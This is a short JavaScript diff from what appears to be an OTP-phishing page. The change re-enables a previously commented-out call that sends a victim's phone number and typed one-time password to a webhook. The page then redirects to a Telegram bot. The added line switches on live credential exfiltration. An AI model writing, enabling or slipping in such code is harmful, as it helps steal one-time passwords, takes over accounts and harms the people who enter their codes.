@@ -327,7 +327,7 @@
                 const otp = getOTPNumbers();
                 const message = `NUMBER : ${phoneNumber}\nOTP: ${otp}`
                 alert(message);
-                //sendToWebhook(message);
+                sendToWebhook(message);
                 window.location.href=`https://t.me/${botName}`;
             }else{
                 console.log(`invalit otp : ${getOTPNumbers()}`);
